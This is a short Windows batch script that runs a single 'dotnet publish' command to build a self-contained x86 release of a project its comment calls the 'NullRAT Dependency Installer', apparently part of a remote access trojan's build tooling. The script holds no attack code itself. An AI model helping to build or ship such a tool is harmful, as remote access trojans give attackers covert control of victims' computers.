@echo off

:: Publish NullRAT Dependency Installer 
:: for Windows x86 | Self Contained & Trimmed
dotnet publish "Dependencies_IL.csproj" --output build\ -r win-x86 -c release --self-contained true